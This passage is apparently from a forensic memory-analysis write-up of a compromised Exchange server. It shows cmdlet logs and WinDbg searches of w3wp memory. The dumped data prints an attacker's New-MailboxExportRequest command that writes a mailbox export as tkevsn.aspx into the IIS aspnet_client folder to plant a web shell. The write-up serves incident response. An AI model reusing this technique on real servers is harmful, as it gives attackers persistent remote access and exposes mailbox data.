10:29:56 PM;TaskModuleLatency=49;TaskModuleLatency.C=89;PowerShellLatency.C=9;ProvisioningLayerLatency.C=8;BizLogic.C=14;Admin Audit Log Agent=0;BizLogic.InnerProcessRecord/InternalValidate=11612;BizLogic.InnerProcessRecord/InternalValidate.ADC=22;BizLogic.InnerProcessRecord/InternalValidate.AD=38;BizLogic.InnerProcessRecord/InternalValidate.ATEC=11;BizLogic.InnerProcessRecord/InternalValidate.ATE=23;BizLogic.Task.ProcessRecord/InnerProcessRecord=11630;BizLogic.Task.ProcessRecord/InnerProcessRecord.ADC=24;BizLogic.Task.ProcessRecord/InnerProcessRecord.AD=40;BizLogic.Task.ProcessRecord/InnerProcessRecord.ATEC=11;BizLogic.Task.ProcessRecord/InnerProcessRecord.ATE=23;Admin Audit Log Agent.C=3;BizLogic.Task.ProcessRecord.Main.1=11877;BizLogic.Task.ProcessRecord.Main.1.ADC=30;BizLogic.Task.ProcessRecord.Main.1.AD=47;BizLogic.Task.ProcessRecord.Main.1.ATEC=12;BizLogic.Task.ProcessRecord.Main.1.ATE=23;BizLogic.Task.ProcessRecord.Retry=11877;BizLogic.Task.ProcessRecord.Retry.ADC=30;BizLogic.Task.ProcessRecord.Retry.AD=47;BizLogic.Task.ProcessRecord.Retry.ATEC=12;BizLogic.Task.ProcessRecord.Retry.ATE=23;ProcessRecord.ADC=30;ProcessRecord.AD=47;ProcessRecord.ATEC=12;ProcessRecord.ATE=23;BizLogic.Task.ProcessRecord=11881;BizLogic.Task.ProcessRecord.ADC=30;BizLogic.Task.ProcessRecord.AD=47;BizLogic.Task.ProcessRecord.ATEC=12;BizLogic.Task.ProcessRecord.ATE=23;Cmd=12075;Cmd.ADC=31;Cmd.AD=49;Cmd.ATEC=19;Cmd.ATE=23;,PSSenderInfo=jones@contoso.com;ADServerSettingsInEnd=ADViewEntireForest:False WriteShadowProperties:False WriteOriginatingChangeTimestamp:False ADRecipientViewRoot:contoso.com ADConfigurationDomainControllers:WIN-S3BI0QBR12A.contoso.com ADPreferredGlobalCatalogs:WIN-S3BI0QBR12A.contoso.com ADPreferredDomainControllers:WIN-S3BI0QBR12A.contoso.com ADUserPreferredDomainControllers: ;,ProcessRecord=Microsoft.Exchange.Data.Storage.ConnectionFailedTransientException: Failed to communicate with the mailbox database. ---> Microsoft.Mapi.MapiExceptionNetworkError: MapiExceptionNetworkError: Unable to make connection to the server. (hr 0x80004005  ec 2423)\nDiagnostic context:\n    ......\n    Lid: 14744   dwParam: 0x0 Msg: EEInfo: Status: 1722\n    Lid: 9624    dwParam: 0x0 Msg: EEInfo: Detection location: 323\n    Lid: 13720   dwParam: 0x0 Msg: EEInfo: Flags: 0\n    Lid: 11672   dwParam: 0x0 Msg: EEInfo: NumberOfParameters: 0\n    Lid: 62184  \n    Lid: 16280   dwParam: 0x0 Msg: EEInfo: ComputerName: n/a\n    Lid: 8600    dwParam: 0x0 Msg: EEInfo: ProcessID: 6832\n    Lid: 12696   dwParam: 0x0 Msg: EEInfo: Generation Time: 0423-11-09T22:30:08.2060000Z\n    Lid: 10648   dwParam: 0x0 Msg: EEInfo: Generating component: 18\n    Lid: 14744   dwParam: 0x0 Msg: EEInfo: Status: 1237\n    Lid: 9624    dwParam: 0x0 Msg: EEInfo: Detection location: 313\n    Lid: 13720   dwParam: 0x0 Msg: EEInfo: Flags: 0\n    Lid: 11672   dwParam: 0x0 Msg: EEInfo: NumberOfParameters: 0\n    Lid: 62184  \n    Lid: 16280   dwParam: 0x0 Msg: EEInfo: ComputerName: n/a\n    Lid: 8600    dwParam: 0x0 Msg: EEInfo: ProcessID: 6832\n    Lid: 12696   dwParam: 0x0 Msg: EEInfo: Generation Time: 0423-11-09T22:30:08.2060000Z\n    Lid: 10648   dwParam: 0x0 Msg: EEInfo: Generating component: 18\n    Lid: 14744   dwParam: 0x0 Msg: EEInfo: Status: 10060\n    Lid: 9624    dwParam: 0x0 Msg: EEInfo: Detection location: 311\n    Lid: 13720   dwParam: 0x0 Msg: EEInfo: Flags: 0\n    Lid: 11672   dwParam: 0x0 Msg: EEInfo: NumberOfParameters: 3\n    Lid: 12952   dwParam: 0x0 Msg: EEInfo: prm[0]: Long val: 135\n    Lid: 15000   dwParam: 0x0 Msg: EEInfo: prm[1]: Pointer val: 0x0               \n    Lid: 15000   dwParam: 0x0 Msg: EEInfo: prm[2]: Pointer val: 0xCC317AC00000000 \n    Lid: 62184  \n    Lid: 16280   dwParam: 0x0 Msg: EEInfo: ComputerName: n/a\n    Lid: 8600    dwParam: 0x0 Msg: EEInfo: ProcessID: 6832\n    Lid: 12696   dwParam: 0x0 Msg: EEInfo: Generation Time: 0423-11-09T22:30:08.2060000Z\n    Lid: 10648   dwParam: 0x0 Msg: EEInfo: Generating component: 18\n    Lid: 14744   dwParam: 0x0 Msg: EEInfo: Status: 10060\n    Lid: 9624    dwParam: 0x0 Msg: EEInfo: Detection location: 318\n    Lid: 13720   dwParam: 0x0 Msg: EEInfo: Flags: 0\n    Lid: 11672   dwParam: 0x0 Msg: EEInfo: NumberOfParameters: 0\n    Lid: 53361   StoreEc: 0x977     \n    Lid: 51859  \n    Lid: 33649   StoreEc: 0x977     \n    Lid: 43315  \n    Lid: 58225   StoreEc: 0x977     \n    Lid: 39912   StoreEc: 0x977     \n    Lid: 54129   StoreEc: 0x977     \n    Lid: 50519  \n    Lid: 59735   StoreEc: 0x977     \n    Lid: 59199  \n    Lid: 27356   StoreEc: 0x977     \n    Lid: 65279  \n    Lid: 52465   StoreEc: 0x977     \n    Lid: 60065  \n    Lid: 33777   StoreEc: 0x977     \n    Lid: 59805  \n    Lid: 52487   StoreEc: 0x977     \n    Lid: 19778  \n    Lid: 27970   StoreEc: 0x977     \n    Lid: 17730  \n    Lid: 25922   StoreEc: 0x977         at Microsoft.Mapi.MapiExceptionHelper.InternalThrowIfErrorOrWarning(String message  Int32 hresult  Boolean allowWarnings  Int32 ec  DiagnosticContext diagCtx  Exception innerException)    at Microsoft.Mapi.MapiExceptionHelper.ThrowIfError(String message  Int32 hresult  IExInterface iUnknown  Exception innerException)    at Microsoft.Mapi.ExRpcConnectionFactory.Create(ExRpcConnectionInfo connectionInfo)    at Microsoft.Mapi.MapiStore.OpenMapiStore(String serverDn  String userDn  String mailboxDn  Guid guidMailbox  Guid guidMdb  String userName  String domainName  String password  String httpProxyServerName  ConnectFlag connectFlags  OpenStoreFlag storeFlags  CultureInfo cultureInfo  Boolean wantRedirect  String& correctServerDN  ClientIdentityInfo clientIdentity  String applicationId  Client xropClient  Boolean wantWebServices  Byte[] clientSessionInfo  TimeSpan connectionTimeout  TimeSpan callTimeout  Byte[] tenantHint)    at Microsoft.Mapi.MapiStore.OpenMailbox(String serverDn  String userDn  Guid guidMailbox  Guid guidMdb  String userName  String domainName  String password  ConnectFlag connectFlags  OpenStoreFlag storeFlags  CultureInfo cultureInfo  WindowsIdentity windowsIdentity  String applicationId  TimeSpan connectionTimeout  TimeSpan callTimeout  Byte[] tenantPartitionHint)    at Microsoft.Exchange.MailboxReplicationService.MapiUtils.GetSystemMailbox(Guid mdbGuid  DatabaseInformation db  String dcName  NetworkCredential cred  Boolean allowCrossSiteLogon)    at Microsoft.Exchange.MailboxReplicationService.RequestJobProvider.EnsureStoreConnectionExists(Guid mdbGuid)    at Microsoft.Exchange.Management.Migration.MailboxReplication.RequestBase.NewRequest`1.AttachToMdb()    at Microsoft.Exchange.Management.Migration.MailboxReplication.RequestBase.NewRequest`1.InternalValidate()    at Microsoft.Exchange.Management.Migration.MailboxReplication.MailboxExportRequest.NewMailboxExportRequest.InternalValidate()    at Microsoft.Exchange.Configuration.Tasks.Task.<ProcessRecord>b__91_1()    at Microsoft.Exchange.Configuration.Tasks.Task.InvokeRetryableFunc(String funcName  Action func  Boolean terminatePipelineIfFailed)    --- End of inner exception stack trace ---;ExceptionStringId=ExD5D911;,,,,"-Mailbox ""<SNIP-PII>"" -Name ""<SNIP-PII>"" -ContentFilter ""<SNIP-PII>"" -FilePath ""<SNIP-PII>"""
2023-11-09T22:30:18.455Z,2023-11-09T22:30:18.407Z,2d91233f-4398-44c5-8a42-d1e62cd4047b,,15,1,1713,5,EXCHANGE2012,6832,w3wp#MSExchangePowerShellAppPool,5,,,Administrator,S-1-5-21-2955954753-2086716808-563623376-500,,,True,PowerShell,Get-MailboxExportRequest,,a2ab36ed-d713-40b1-adeb-2e7bb1aaa7cc,,,GCRandomly,False,contoso.com,WIN-S3BI0QBR12A.contoso.com,WIN-S3BI0QBR12A.contoso.com,WIN-S3BI0QBR12A.contoso.com,,,,,,,,,,,,0,,,0,10,28,1,,30,0,,10,48342,48,,Success,,,GetApplicationPrivateData=11/9/2023 10:30:08 PM;WinRMDataReceiver.LoadItemsFromNamedPipe=0;WinRMDataReceiver.LoadItemsFromAuthenticationType=0;WinRMDataReceiver.Ctor=0;ExchangeRunspaceConfiguration=336;ExchangeRunspaceConfiguration.C=23;PowerShellThrottlingPolicyUpdater=0;InitialSessionStateBuilder=255;GetInitialSessionStateCore=339;GetInitialSessionState=11/9/2023 10:30:08 PM;,ADServerSettingsInEnd=ADViewEntireForest:False WriteShadowProperties:False WriteOriginatingChangeTimestamp:False ADRecipientViewRoot:contoso.com ADConfigurationDomainControllers:WIN-S3BI0QBR12A.contoso.com ADPreferredGlobalCatalogs:WIN-S3BI0QBR12A.contoso.com ADPreferredDomainControllers:WIN-S3BI0QBR12A.contoso.com ADUserPreferredDomainControllers: ;,,,,,
2023-11-09T22:30:18.457Z,2023-11-09T22:30:18.421Z,2d91233f-4398-44c5-8a42-d1e62cd4047b,,15,1,1713,5,EXCHANGE2012,6832,w3wp#MSExchangePowerShellAppPool,5,,,Administrator,S-1-5-21-2955954753-2086716808-563623376-500,,,True,PowerShell,Remove-MailboxExportRequest,"-Confirm ""False""",191681e6-0fe2-4dc7-b72a-37694b76db1c,,,SessionState,False,contoso.com,WIN-S3BI0QBR12A.contoso.com,WIN-S3BI0QBR12A.contoso.com,WIN-S3BI0QBR12A.contoso.com,,,,,,,,,,,,,,,0,4,,1,,1,0,,2,48344,35,,Success,,,GetApplicationPrivateData=11/9/2023 10:30:08 PM;WinRMDataReceiver.LoadItemsFromNamedPipe=0;WinRMDataReceiver.LoadItemsFromAuthenticationType=0;WinRMDataReceiver.Ctor=0;ExchangeRunspaceConfiguration=336;ExchangeRunspaceConfiguration.C=23;PowerShellThrottlingPolicyUpdater=0;InitialSessionStateBuilder=255;GetInitialSessionStateCore=339;GetInitialSessionState=11/9/2023 10:30:08 PM;TaskModuleLatency=0;TaskModuleLatency.C=30;PowerShellLatency.C=3;ProvisioningLayerLatency.C=3;BizLogic.C=6;Admin Audit Log Agent=0;Cmd=35;Cmd.ADC=1;Cmd.AD=1;,ADServerSettingsInEnd=null;PSSenderInfo=jones@contoso.com;,,,,,"-Confirm ""False"""
,,de6ad950-db9a-4337-ab36-021831076304,,15,1,1713,5,EXCHANGE2012,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,600026,,,,,,,,,,,,
,,3067a336-16c1-478e-a415-78f2ade17f51,,15,1,1713,5,EXCHANGE2012,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,600016,,,,,,,,,,,,
```

This command searches through the entire memory space for the string **`w3wp#MSExchangePowerShellAppPool`**. The presence of **`w3wp#MSExchangePowerShellAppPool`** in these logs indicates that the worker process for the Exchange PowerShell Application Pool is handling these requests. The displayed bytes of memory shows the data that is located in the **`Rps_Cmdlet_2023110922-1.LOG`** file.

```
0:000> .foreach (address { s -[l 8]a 0 L?0x7fffffffffffffff "w3wp#MSExchangePowerShellAppPool" }) { .if ($spat("${address}", "0000*`*")) { .echo Found "w3wp#MSExchangePowerShellAppPool" at ${address}; dc ${address} L100 } };
Found "w3wp#MSExchangePowerShellAppPool" at 0000014e`38987bae
0000014e`38987bae  70773377 45534d23 61686378 5065676e  w3wp#MSExchangeP
0000014e`38987bbe  7265776f 6c656853 7070416c 6c6f6f50  owerShellAppPool
0000014e`38987bce  2c2c352c 6d64412c 73696e69 74617274  ,5,,,Administrat
0000014e`38987bde  532c726f 352d312d 2d31322d 35353932  or,S-1-5-21-2955
0000014e`38987bee  37343539 322d3335 37363830 30383631  954753-208671680
0000014e`38987bfe  36352d38 33323633 2d363733 2c303035  8-563623376-500,
0000014e`38987c0e  72542c2c 502c6575 7265776f 6c656853  ,,True,PowerShel
0000014e`38987c1e  654e2c6c 614d2d77 6f626c69 70784578  l,New-MailboxExp
0000014e`38987c2e  5274726f 65757165 222c7473 69614d2d  ortRequest,"-Mai
0000014e`38987c3e  786f626c 4a222220 73656e6f 2d202222  lbox ""Jones"" -
0000014e`38987c4e  656d614e 32222220 35353730 33623630  Name ""2075506b3
0000014e`38987c5e  34373064 62353039 39623730 38333939  d074905b07b99938
0000014e`38987c6e  32643134 22633536 432d2022 65746e6f  41d265c"" -Conte
0000014e`38987c7e  6946746e 7265746c 53222220 656a6275  ntFilter ""Subje
0000014e`38987c8e  2d207463 27207165 35373032 62363035  ct -eq '2075506b
0000014e`38987c9e  37306433 35303934 62373062 33393939  3d074905b07b9993
0000014e`38987cae  64313438 63353632 20222227 6c69462d  841d265c'"" -Fil
0000014e`38987cbe  74615065 22222068 32315c5c 2e302e37  ePath ""\\127.0.
0000014e`38987cce  5c312e30 695c2463 7074656e 775c6275  0.1\c$\inetpub\w
0000014e`38987cde  6f727777 615c746f 656e7073 6c635f74  wwroot\aspnet_cl
0000014e`38987cee  746e6569 656b745c 2e6e7376 78707361  ient\tkevsn.aspx
0000014e`38987cfe  2c222222 33326633 32656238 3962652d  """,3f238be2-eb9
0000014e`38987d0e  39342d35 382d6532 2d646265 39656139  5-492e-8ebd-9ae9
0000014e`38987d1e  63363934 31653030 472c2c2c 6e615243  496c00e1,,,GCRan
0000014e`38987d2e  6c6d6f64 61462c79 2c65736c 746e6f63  domly,False,cont
0000014e`38987d3e  2e6f736f 2c6d6f63 2d4e4957 49423353  oso.com,WIN-S3BI
0000014e`38987d4e  52425130 2e413231 746e6f63 2e6f736f  0QBR12A.contoso.
0000014e`38987d5e  2c6d6f63 2d4e4957 49423353 52425130  com,WIN-S3BI0QBR
0000014e`38987d6e  2e413231 746e6f63 2e6f736f 2c6d6f63  12A.contoso.com,
0000014e`38987d7e  2d4e4957 49423353 52425130 2e413231  WIN-S3BI0QBR12A.
0000014e`38987d8e  746e6f63 2e6f736f 2c6d6f63 2c2c2c2c  contoso.com,,,,,
0000014e`38987d9e  2c2c2c2c 302c2c2c 302c2c2c 3239312c  ,,,,,,,0,,,0,192
0000014e`38987dae  3831312c 312c3138 32312c2c 2c373630  ,11881,1,,12067,
0000014e`38987dbe  2c2c3333 38332c39 2c373733 37303231  33,,9,38377,1207
0000014e`38987dce  452c2c35 726f7272 472c2c2c 70417465  5,,Error,,,GetAp
0000014e`38987dde  63696c70 6f697461 6972506e 65746176  plicationPrivate
0000014e`38987dee  61746144 2f31313d 30322f39 31203332  Data=11/9/2023 1
0000014e`38987dfe  39323a30 2035353a 573b4d50 4d526e69  0:29:55 PM;WinRM
0000014e`38987e0e  61746144 65636552 72657669 616f4c2e  DataReceiver.Loa
0000014e`38987e1e  65744964 7246736d 614e6d6f 5064656d  dItemsFromNamedP
0000014e`38987e2e  3d657069 69573b31 444d526e 52617461  ipe=1;WinRMDataR
0000014e`38987e3e  69656365 2e726576 64616f4c 6d657449  eceiver.LoadItem
0000014e`38987e4e  6f724673 7475416d 746e6568 74616369  sFromAuthenticat
0000014e`38987e5e  546e6f69 3d657079 69573b30 444d526e  ionType=0;WinRMD
0000014e`38987e6e  52617461 69656365 2e726576 726f7443  ataReceiver.Ctor
0000014e`38987e7e  453b313d 61686378 5265676e 70736e75  =1;ExchangeRunsp
0000014e`38987e8e  43656361 69666e6f 61727567 6e6f6974  aceConfiguration
0000014e`38987e9e  3535333d 6378453b 676e6168 6e755265  =355;ExchangeRun
0000014e`38987eae  63617073 6e6f4365 75676966 69746172  spaceConfigurati
0000014e`38987ebe  432e6e6f 3b33323d 65776f50 65685372  on.C=23;PowerShe
0000014e`38987ece  68546c6c 74746f72 676e696c 696c6f50  llThrottlingPoli
0000014e`38987ede  70557963 65746164 3b303d72 74696e49  cyUpdater=0;Init
0000014e`38987eee  536c6169 69737365 74536e6f 42657461  ialSessionStateB
0000014e`38987efe  646c6975 323d7265 473b3237 6e497465  uilder=272;GetIn
0000014e`38987f0e  61697469 7365536c 6e6f6973 74617453  itialSessionStat
0000014e`38987f1e  726f4365 35333d65 65473b37 696e4974  eCore=357;GetIni
0000014e`38987f2e  6c616974 73736553 536e6f69 65746174  tialSessionState
0000014e`38987f3e  2f31313d 30322f39 31203332 39323a30  =11/9/2023 10:29
0000014e`38987f4e  2036353a 543b4d50 4d6b7361 6c75646f  :56 PM;TaskModul
0000014e`38987f5e  74614c65 79636e65 3b39343d 6b736154  eLatency=49;Task
0000014e`38987f6e  75646f4d 614c656c 636e6574 3d432e79  ModuleLatency.C=
0000014e`38987f7e  503b3938 7265776f 6c656853 74614c6c  89;PowerShellLat
0000014e`38987f8e  79636e65 393d432e 6f72503b 69736976  ency.C=9;Provisi
0000014e`38987f9e  6e696e6f 79614c67 614c7265 636e6574  oningLayerLatenc

<<< SNIPPET >>>
```

Here we can see our Webshell just like how it was described from the article of Mandiant:

```
0:000> da /c 100 0000014e`38987c1e
0000014e`38987c1e  "l,New-MailboxExportRequest,"-Mailbox ""Jones"" -Name ""2075506b3d074905b07b9993841d265c"" -ContentFilter ""Subject -eq '2075506b3d074905b07b9993841d265c'"" -FilePath ""\\127.0.0.1\c$\inetpub\wwwroot\aspnet_client\tkevsn.aspx""",3f238be2-eb95-492e-8ebd-9ae9"
0000014e`38987d1e  "496c00e1,,,GCRandomly,False,contoso.com,WIN-S3BI0QBR12A.contoso.com,WIN-S3BI0QBR12A.contoso.com,WIN-S3BI0QBR12A.contoso.com,,,,,"
```
